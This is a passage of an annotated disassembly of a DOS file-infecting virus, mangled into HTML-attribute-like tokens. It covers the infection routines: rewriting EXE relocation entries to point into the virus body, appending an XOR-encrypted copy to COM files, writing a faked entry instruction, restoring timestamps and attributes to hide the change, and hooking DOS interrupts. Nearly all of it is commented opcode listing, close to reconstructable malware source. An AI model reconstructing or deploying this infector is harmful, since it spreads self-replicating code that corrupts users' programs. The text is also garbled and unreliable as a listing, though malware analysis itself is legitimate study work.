bytes="" ;="" check="" relocation="" table="" entry="" 2912="" 8b4502="" mov="" ax,[di+02]="" ;="" get="" segment="" 2915="" 3b06b502="" cmp="" ax,[02b5]="" ;="" is="" it="" cs="" 2919="" 7551="" jne="" 296c="" ;="" check="" next="" entry="" 291b="" 8b05="" mov="" ax,[di]="" ;="" get="" offset="" 291d="" 3b06b302="" cmp="" ax,[02b3]="" ;="" is="" it="" ip="" 2921="" 7249="" jb="" 296c="" ;="" check="" next="" entry="" ;="" relocatin="" item="" points="" at="" entry="" point="" or="" above="" 2923="" a1b302="" mov="" ax,[02b3]="" ;="" ip="" 2926="" 050500="" add="" ax,0005="" ;="" length="" of="" far="" call="" 2929="" 3b05="" cmp="" ax,[di]="" ;="" relocation="" item="" point="" inside="" call="" code="" 292b="" 763f="" jbe="" 296c="" ;="" no,="" consider="" next="" entry="" ;="" modify="" relocation="" table="" and="" write="" it="" to="" file="" ;="" let="" relocation="" item="" point="" at="" the="" same="" code="" but="" now="" stored="" in="" virus="" ;="" body="" in="" local="" buffer="" 292d="" a1c502="" mov="" ax,[02c5]="" ;="" segment="" of="" virus="" entry="" point="" 2930="" 894502="" mov="" [di+02],ax="" ;="" store="" in="" buffer="" 2933="" 8b05="" mov="" ax,[di]="" ;="" offset="" 2935="" 8b1eb302="" mov="" bx,[02b3]="" ;="" old="" ip="" 2939="" 29d8="" sub="" ax,bx="" 293b="" 50="" push="" ax="" ;="" store="" 293c="" b8aa02="" mov="" ax,02aa="" ;="" offset="" of="" local="" buffer="" 293f="" 2d0001="" sub="" ax,0100="" ;="" offset="" in="" virus="" body="" 2942="" 8b1ec302="" mov="" bx,[02c3]="" ;="" offset="" of="" entry="" point="" in="" ram="" 2946="" 01d8="" add="" ax,bx="" 2948="" 5b="" pop="" bx="" 2949="" 01d8="" add="" ax,bx="" 294b="" 8905="" mov="" [di],ax="" ;="" new="" offset="" 294d="" 8b0ec702="" mov="" cx,[02c7]="" ;="" restore="" file="" position="" 2951="" 8b16c902="" mov="" dx,[02c9]="" 2955="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" 2958="" 5b="" pop="" bx="" ;="" restore="" handle="" 2959="" 53="" push="" bx="" 295a="" cd21="" int="" 21="" 295c="" 8b0ecb02="" mov="" cx,[02cb]="" ;="" number="" of="" bytes="" 2960="" b440="" mov="" ah,40="" ;="" write="" file="" 2962="" 5b="" pop="" bx="" ;="" handle="" 2963="" 53="" push="" bx="" 2964="" ba0000="" mov="" dx,0000="" ;="" from="" 2967="" cd21="" int="" 21="" 2969="" eb19="" jmp="" 2984="" ;="" close="" file,="" etc.="" exit="" 296b="" 90="" nop="" 296c="" 83c704="" add="" di,0004="" ;="" next="" entry="" in="" relocation="" table="" 296f="" a1cd02="" mov="" ax,[02cd]="" ;="" number="" of="" readed="" bytes="" 2972="" 2d0001="" sub="" ax,0100="" ;="" buffer="" size="" 2975="" 01f8="" add="" ax,di="" ;="" current="" position="" in="" table="" 2977="" 39f0="" cmp="" ax,si="" ;="" table="" size="" 2979="" 7409="" je="" 2984="" ;="" close="" file,="" etc.="" exit="" 297b="" 3b3ecb02="" cmp="" di,[02cb]="" ;="" end="" of="" buffer?="" 297f="" 7291="" jb="" 2912="" ;="" no,="" check="" next="" relocation="" item="" 2981="" e967ff="" jmp="" 28eb="" ;="" read="" next="" part="" of="" relocation="" table="" 2984="" eb67="" jmp="" 29ed="" ;="" close="" file,="" etc.="" and="" exit="" 2986="" 90="" nop="" ;-------------------="" ;="" infect="" com="" file="" ;="" check="" maximum="" file="" size="" 2987="" 8b0e8102="" mov="" cx,[0281]="" ;="" file="" size="" 298b="" 81f948ee="" cmp="" cx,ee48="" ;="" maximum="" file="" size="" (61000)="" 298f="" 7209="" jb="" 299a="" ;="" file="" too="" long="" or="" too="" short,="" exit="" 2991="" 5b="" pop="" bx="" 2992="" 58="" pop="" ax="" 2993="" 58="" pop="" ax="" 2994="" e87a00="" call="" 2a11="" ;="" close="" file="" and="" restore="" int="" 24h="" 2997="" e937fb="" jmp="" 24d1="" ;="" jump="" to="" old="" int="" 21h="" ;="" check="" minimum="" file="" size="" 299a="" 3b0e8302="" cmp="" cx,[0283]="" ;="" virus="" length,="" minimum="" file="" size="" 299e="" 72f1="" jb="" 2991="" ;="" file="" too="" short,="" exit="" 29a0="" e88100="" call="" 2a24="" ;="" clear="" attributes="" and="" reopen="" file="" 29a3="" c606b00200="" mov="" byte="" ptr="" [02b0],00="" ;="" get="" file="" size="" 29a8="" ba0000="" mov="" dx,0000="" 29ab="" b90000="" mov="" cx,0000="" 29ae="" b80242="" mov="" ax,4202="" ;="" move="" file="" ptr="" to="" eof="" 29b1="" 5b="" pop="" bx="" ;="" restore="" handle="" 29b2="" 53="" push="" bx="" 29b3="" cd21="" int="" 21="" 29b5="" be8302="" mov="" si,0283="" 29b8="" 8b0c="" mov="" cx,[si]="" ;="" virus="" size="" 29ba="" b440="" mov="" ah,40="" ;="" write="" file="" 29bc="" 51="" push="" cx="" 29bd="" bb4007="" mov="" bx,0740="" ;="" offset="" of="" buffer="" ;="" encrypt="" block="" 29c0="" 8a07="" mov="" al,[bx]="" 29c2="" 34bb="" xor="" al,bb="" 29c4="" 8807="" mov="" [bx],al="" 29c6="" 43="" inc="" bx="" 29c7="" e2f7="" loop="" 29c0="" ;="" write="" to="" file="" 29c9="" 59="" pop="" cx="" ;="" block="" size="" 29ca="" 5b="" pop="" bx="" ;="" handle="" 29cb="" 53="" push="" bx="" 29cc="" ba4007="" mov="" dx,0740="" ;="" offset="" of="" buffer="" 29cf="" cd21="" int="" 21="" 29d1="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" to="" bof="" 29d4="" ba0000="" mov="" dx,0000="" 29d7="" b90000="" mov="" cx,0000="" 29da="" cd21="" int="" 21="" 29dc="" bb1001="" mov="" bx,0110="" ;="" faked="" instruction="" 29df="" be8302="" mov="" si,0283="" 29e2="" 8b0c="" mov="" cx,[si]="" 29e4="" ba0001="" mov="" dx,0100="" 29e7="" b440="" mov="" ah,40="" ;="" write="" file="" 29e9="" 5b="" pop="" bx="" ;="" handle="" 29ea="" 53="" push="" bx="" 29eb="" cd21="" int="" 21="" ;="" common="" (exe="" and="" com)="" exit="" code,="" restore="" file="" date/time="" stamp="" 29ed="" 5b="" pop="" bx="" ;="" handle="" 29ee="" 5a="" pop="" dx="" ;="" file="" date="" stamp="" 29ef="" 59="" pop="" cx="" ;="" file="" time="" stamp="" 29f0="" 53="" push="" bx="" ;="" store="" handle="" 29f1="" b80157="" mov="" ax,5701="" ;="" restore="" file="" time/date="" stamp="" 29f4="" cd21="" int="" 21="" ;="" restore="" file="" attributes="" 29f6="" 8b16d402="" mov="" dx,[02d4]="" ;="" path="" offset="" 29fa="" 8e1ed202="" mov="" ds,[02d2]="" ;="" path="" segment="" 29fe="" b80143="" mov="" ax,4301="" ;="" set="" file="" attributes="" 2a01="" 2e8b0ed002="" mov="" cx,cs:[02d0]="" ;="" restore="" attributes="" 2a06="" cd21="" int="" 21="" 2a08="" 0e="" push="" cs="" 2a09="" 1f="" pop="" ds="" 2a0a="" 5b="" pop="" bx="" ;="" handle="" 2a0b="" e80300="" call="" 2a11="" ;="" close="" file="" and="" restore="" int="" 24h="" 2a0e="" e9c0fa="" jmp="" 24d1="" ;="" jump="" to="" old="" int="" 21h="" ;-------------------------------="" ;="" close="" file="" and="" restore="" int="" 24h="" 2a11="" b8003e="" mov="" ax,3e00="" ;="" close="" file="" 2a14="" cd21="" int="" 21="" ;----------------="" ;="" restore="" int="" 24h="" 2a16="" 8b1e8502="" mov="" bx,[0285]="" 2a1a="" 8e068702="" mov="" es,[0287]="" 2a1e="" b82425="" mov="" ax,2524="" ;="" restore="" int="" 24h="" 2a21="" cd21="" int="" 21="" 2a23="" c3="" ret="" ;------------------------------------------------="" ;="" clear="" file="" attributes="" and="" reopen="" for="" read/write="" 2a24="" 55="" push="" bp="" 2a25="" 8bec="" mov="" bp,sp="" 2a27="" 1e="" push="" ds="" 2a28="" b80143="" mov="" ax,4301="" ;="" set="" file="" attributes="" 2a2b="" 8b16d402="" mov="" dx,[02d4]="" ;="" path="" offset="" 2a2f="" 8e1ed202="" mov="" ds,[02d2]="" ;="" path="" segment="" 2a33="" 31c9="" xor="" cx,cx="" ;="" clear="" all="" 2a35="" cd21="" int="" 21="" 2a37="" 7306="" jnb="" 2a3f="" ;="" continue="" ;="" exit="" to="" old="" int="" 21h="" 2a39="" 1f="" pop="" ds="" 2a3a="" 5d="" pop="" bp="" 2a3b="" 58="" pop="" ax="" 2a3c="" e945ff="" jmp="" 2984="" ;="" exit="" 2a3f="" 368b5e04="" mov="" bx,ss:[bp+04]="" ;="" restore="" handle="" 2a43="" b8003e="" mov="" ax,3e00="" ;="" close="" file="" 2a46="" cd21="" int="" 21="" 2a48="" b8023d="" mov="" ax,3d02="" ;="" open="" file="" for="" read/write="" 2a4b="" fa="" cli="" 2a4c="" 9c="" pushf="" 2a4d="" 2eff1ec201="" call="" far="" [01c2]="" ;="" old="" int="" 21h="" 2a52="" 1f="" pop="" ds="" 2a53="" 36894604="" mov="" ss:[bp+04],ax="" ;="" handle="" 2a57="" 5d="" pop="" bp="" 2a58="" c3="" ret="" ;="" end="" of="" file="" ;----------------------------------------="" ;="" buffer="" for="" header="" of="" infected="" exe="" file="" cs:0740="" ;="" 'mz'="" cs:0742="" ;="" partpag="" cs:0744="" ;="" pagecnt="" cs:0746="" ;="" relocnt="" cs:0748="" ;="" hdrsize="" cs:074a="" ;="" minmem="" cs:074c="" ;="" maxmem="" cs:074e="" ;="" reloss="" cs:0750="" ;="" exesp="" cs:0752="" ;="" chksum="" cs:0754="" ;="" exeip="" cs:0756="" ;="" relocs="" cs:0758="" ;="" tabloff="" cs:075a="" ;="" overlay=""></->